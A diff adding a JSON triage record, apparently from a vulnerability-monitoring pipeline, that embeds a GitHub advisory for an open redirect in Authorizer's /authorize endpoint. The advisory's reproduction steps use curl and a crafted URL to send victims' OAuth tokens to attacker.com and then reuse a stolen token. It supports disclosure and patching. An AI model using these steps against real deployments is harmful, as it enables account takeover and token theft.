@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/60306789?v=4\", \"events_url\": \"https://api.github.com/users/morimori-dev/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/morimori-dev/followers\", \"following_url\": \"https://api.github.com/users/morimori-dev/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/morimori-dev/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/morimori-dev\", \"id\": 60306789, \"login\": \"morimori-dev\", \"node_id\": \"MDQ6VXNlcjYwMzA2Nzg5\", \"organizations_url\": \"https://api.github.com/users/morimori-dev/orgs\", \"received_events_url\": \"https://api.github.com/users/morimori-dev/received_events\", \"repos_url\": \"https://api.github.com/users/morimori-dev/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/morimori-dev/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/morimori-dev/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/morimori-dev\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54072\", \"cvss\": {\"score\": 9.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-601\", \"name\": \"URL Redirection to Untrusted Site ('Open Redirect')\"}], \"description\": \"## Summary\\n\\nThe `/authorize` endpoint accepts any `redirect_uri` without validating it against `AllowedOrigins`. When `response_type=token` or `response_type=id_token`, the server appends `access_token`, `id_token`, and `refresh_token` as query parameters and issues a 302 redirect to the attacker-supplied URL. An unauthenticated attacker can obtain the required `client_id` from the public `/graphql?query={meta{client_id}}` endpoint.\\n\\nPartial fix was applied in v2.0.1 to other handlers (`oauth_login`, `verify_email`, `magic_link_login`, `forgot_password`, `invite_members`, `oauth_callback`) but `/authorize` was not included.\\n\\n## Vulnerable Code\\n\\n`internal/http_handlers/authorize.go`:\\n\\n```go\\nredirectURI := strings.TrimSpace(gc.Query(\\\"redirect_uri\\\"))\\n// ... no IsValidOrigin() call ...\\n// response_type=token path (line ~263):\\nif strings.Contains(redirectURI, \\\"?\\\") {\\n    redirectURI = redirectURI + \\\"&\\\" + params\\n} else {\\n    redirectURI = redirectURI + \\\"?\\\" + params\\n}\\nhandleResponse(gc, responseMode, authURL, redirectURI, ...) // 302 to attacker URL\\n```\\n\\nCompare with the fixed `oauth_login.go` in v2.0.1 which calls `validators.IsValidOrigin(redirectURI, h.Config.AllowedOrigins)`.\\n\\n## Steps to Reproduce\\n\\n```bash\\n# 1. Obtain client_id (no authentication required)\\nCLIENT_ID=$(curl -s http://TARGET/graphql \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"query\\\":\\\"{meta{client_id}}\\\"}' | python3 -c \\\"import sys,json; print(json.load(sys.stdin)['data']['meta']['client_id'])\\\")\\n\\necho \\\"client_id: $CLIENT_ID\\\"\\n\\n# 2. Craft the malicious URL and send to victim (victim must be logged in)\\n# When victim opens this URL, tokens are delivered to attacker.com\\nMALICIOUS_URL=\\\"http://TARGET/authorize?response_type=token&client_id=${CLIENT_ID}&redirect_uri=https://attacker.com/steal&scope=openid+profile+email&state=x&response_mode=query\\\"\\n\\necho \\\"Send to victim: $MALICIOUS_URL\\\"\\n\\n# 3. Attacker receives 302 redirect with all tokens:\\n# https://attacker.com/steal?access_token=eyJ...&token_type=bearer&expires_in=...&id_token=eyJ...\\n\\n# 4. Validate stolen token\\ncurl -s http://TARGET/userinfo \\\\\\n  -H \\\"Authorization: Bearer STOLEN_ACCESS_TOKEN\\\"\\n# Returns: {\\\"email\\\":\\\"victim@example.com\\\",\\\"id\\\":\\\"...\\\",\\\"roles\\\":[\\\"user\\\"]}\\n```\\n\\n## Impact\\n\\nAn attacker who tricks a logged-in user into clicking a crafted link can steal the victim's `access_token`, `id_token`, and `refresh_token`. The attacker can then impersonate the victim for the full token lifetime. No user interaction beyond clicking the link is required; the victim's browser issues the redirect automatically.\\n\\n## Proposed Fix\\n\\nAdd the same `IsValidOrigin` check that was applied to the other handlers in v2.0.1:\\n\\n```go\\n// In authorize.go, after reading redirect_uri:\\nif !validators.IsValidOrigin(redirectURI, h.Config.AllowedOrigins) {\\n    handleResponse(gc, responseMode, authURL, redirectURI, map[string]interface{}{\\n        \\\"error\\\":             \\\"invalid_request\\\",\\n        \\\"error_description\\\": \\\"redirect_uri is not allowed\\\",\\n    }, http.StatusBadRequest)\\n    return\\n}\\n```\", \"ghsa_id\": \"GHSA-h29v-hj44-q8cv\", \"github_reviewed_at\": \"2026-07-10T19:25:15Z\", \"html_url\": \"https://github.com/advisories/GHSA-h29v-hj44-q8cv\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-h29v-hj44-q8cv\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54072\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-10T19:25:15Z\", \"references\": [\"https://github.com/authorizerdev/authorizer/security/advisories/GHSA-h29v-hj44-q8cv\", \"https://github.com/advisories/GHSA-h29v-hj44-q8cv\"], \"repository_advisory_url\": \"https://api.github.com/repos/authorizerdev/authorizer/security-advisories/GHSA-h29v-hj44-q8cv\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/authorizerdev/authorizer\", \"summary\": \"Authorizer: Unvalidated redirect_uri in /authorize leaks OAuth2 tokens to attacker-controlled URL\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-10T19:25:16Z\", \"url\": \"https://api.github.com/advisories/GHSA-h29v-hj44-q8cv\", \"vulnerabilities\": [{\"first_patched_version\": \"0.0.0-20260409051328-bd3f5baf6d3d\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/authorizerdev/authorizer\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.0.0-20260409051328-bd3f5baf6d3d\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-h29v-hj44-q8cv",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/authorizerdev/authorizer: < 0.0.0-20260409051328-bd3f5baf6d3d"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-54072"
+    ],
+    "cvss_score": 9.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/authorizerdev/authorizer"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.271982Z",
+  "provenance": {
+    "content_sha256": "81865f8427e41965a25af3e89b6a7f46818b4dff303a43046dc03c812aaaa10f",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-10T19:25:15Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-h29v-hj44-q8cv",
+  "status": "active",
+  "title": "Authorizer: Unvalidated redirect_uri in /authorize leaks OAuth2 tokens to attacker-controlled URL",
+  "updated_at": "2026-07-10T19:25:16Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-h29v-hj44-q8cv"
+}
